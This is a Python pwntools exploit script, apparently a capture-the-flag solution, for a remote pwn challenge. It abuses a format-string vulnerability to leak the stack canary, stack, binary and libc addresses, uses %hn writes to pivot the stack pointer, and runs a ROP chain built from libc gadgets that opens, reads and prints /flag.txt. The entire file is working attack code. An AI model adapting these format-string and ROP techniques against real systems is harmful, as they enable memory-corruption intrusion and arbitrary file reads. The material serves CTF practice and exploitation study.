from pwn import *
import struct
def pad_null_bytes(value):
    return value + '\x00' * (8-len(value))

context( arch = 'amd64', os = 'linux', log_level='info')
elfpostmaster = ELF("./main")
libc          = ELF("/lib/x86_64-linux-gnu/libc.so.6")



#LIBC_BASE: 0x7ffff779d000
#LIBC_OPEN: 0x7ffff78acc40
#LIBC_READ: 0x7ffff78ad070

#0x00000000001306d9 : pop rdx ; pop rsi ; ret
#0x000000000002155f : pop rdi ; ret
#0x0000000000003960 : pop rsp ; ret
#0x000000000003eb61 : add rsp, 0x18 ; ret
#0x000000000003dfed : push rax ; ret
#0x0000000000024e73 : push rax ; push rsp ; ret
#0x00000000000439c8 : pop rax ; ret
#0x000000000009d025 : mov rdi, rsi ; call rax
#0x000000000011014d : mov eax, 1 ; syscall
#0x00000000000008aa : ret

OPEN_OFFSET        = 0x10FC40
READ_OFFSET        = 0x110070
WRITE_OFFSET       = 0x110140

POP_RDX_RSI_OFFSET = 0x1306d9 
POP_RDI_OFFSET     = 0x2155f
POP_RSP_OFFSET     = 0x3960
ADD_RSP_OFFSET     = 0x3eb61
PUSH_RAX_OFFSET    = 0x3dfed
PUSH_RAX_RSP_OFFSET= 0x24e73 
POP_RAX_OFFSET     = 0x439c8
MOV_RDI_RSI_OFFSET = 0x9d025# AND CALL RAX
RET_OFFSET         = 0x8aa
#p = elfpostmaster.process()

#p = process("./main")
p = remote("challs.xmas.htsp.ro", 12003)

if hasattr(p,'pid'):
#if False:
  gdb.attach(p.pid, 
  """
  breakrva 0xbad
  c
  """
  ##breakrva 0xbf8
  )

p.recvline()

# Leak everything we need to know
payload = "%30$p %39$p %40$p %41$p"
p.sendline(payload)
p.recvuntil("Oh, greetings ")
stack, canary, binbase, ret = p.recvline().rstrip().split(" ")

stack    = int(stack, 16)
rsp      = stack - 0x128
ret_addr = stack - 0xd8
ret      = int(ret, 16)    
libcbase = ret - 0x21b97;  
binbase  = int(binbase , 16) - 0xc00
canary   = int(canary, 16)

print "Canary: " + hex(canary) 
print "LIBC:   " + hex(libcbase) 
print "Binary: " + hex(binbase) 
print "Stack:  " + hex(stack) 
print "Return: " + hex(ret) + " at " + hex(ret_addr)
print "================================================================================="

# Helper to set StackPointer to the right address
def setStackPointerAddress(value):
  offset = (stack & 0xffff) + value # calculate overwrite value to get set address of returnaddress to %30 
  #print "[->] Set Stackpointer: " + hex(stack - value)
  p.sendline("%"+str(offset)+"p%30$hn")
  p.recvline()  

"""
  offset = offset for setStackPointer
  value  = what should be written?
  n      = how many bits should be (over-)written? possible values: 16 32 48 oder 64 
"""

# Helper to arrange my numbers on the stack
def write(offset, value, n):
  print "[->] Write to " + hex(offset) + " value " + hex(value) + "("+str(n)+")"
  setStackPointerAddress(offset)
  low = (value & 0xffff)
  p.sendline("%"+str(low)+"x%43$hn")
  p.recvline()
  if n >= 32:
    setStackPointerAddress(offset+2)
    low = (value & 0xffff0000) >> 16
    p.sendline("%"+str(low)+"x%43$hn")
    p.recvline()
  if n >= 48:
    setStackPointerAddress(offset+4)
    low = (value & 0xffff00000000) >> 32
    p.sendline("%"+str(low)+"x%43$hn")
    p.recvline()
  if n >= 64:
    setStackPointerAddress(offset+6)
    low = (value & 0xffff000000000000) >> 48
    p.sendline("%"+str(low)+"x%43$hn")
    p.recvline()

write(-0x10, (libcbase + POP_RSP_OFFSET), 32)  # -0x10 is location of ret address
write(-0x08, (rsp + 0x40), 48)                     # New StackPointer ALIGNED

payload = "A" * 0x10 + "/flag.txt\x00" + "A" * 30  
payload += p64(libcbase + RET_OFFSET)              # "Ubuntu"-Stack Alignment         

# Open File
payload += p64(libcbase + POP_RDI_OFFSET)          
payload += p64(rsp + 0x10) # 1                     
payload += p64(libcbase + POP_RDX_RSI_OFFSET)      
payload += p64(0x00) # 3
payload += p64(0x00) # 2
payload += p64(libcbase + RET_OFFSET)              
payload += p64(libcbase + OPEN_OFFSET)   

# Read File
payload += p64(libcbase + RET_OFFSET)              
payload += p64(libcbase + POP_RDI_OFFSET)
payload += p64(0x03) # 1
payload += p64(libcbase + POP_RDX_RSI_OFFSET)
payload += p64(0x40) # 3
payload += p64(stack + 0x8) 
payload += p64(libcbase + RET_OFFSET)              
payload += p64(libcbase + READ_OFFSET)

# Print Flag
payload += p64(libcbase + RET_OFFSET)              
payload += p64(libcbase + POP_RAX_OFFSET)
payload += p64(binbase + 0xb4c)
payload += p64(libcbase + MOV_RDI_RSI_OFFSET)

p.sendline(payload)

p.sendline("end of letter")
p.recvuntil("year!")

print "\n"
flag = p.recvuntil("}")
print flag
print "\n"

p.recvall(timeout = 2)

